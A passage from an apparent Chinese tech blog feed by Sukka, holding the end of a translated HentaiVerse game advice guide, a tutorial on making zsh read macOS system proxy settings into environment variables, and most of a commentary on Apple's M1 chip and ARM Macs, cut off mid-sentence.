Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 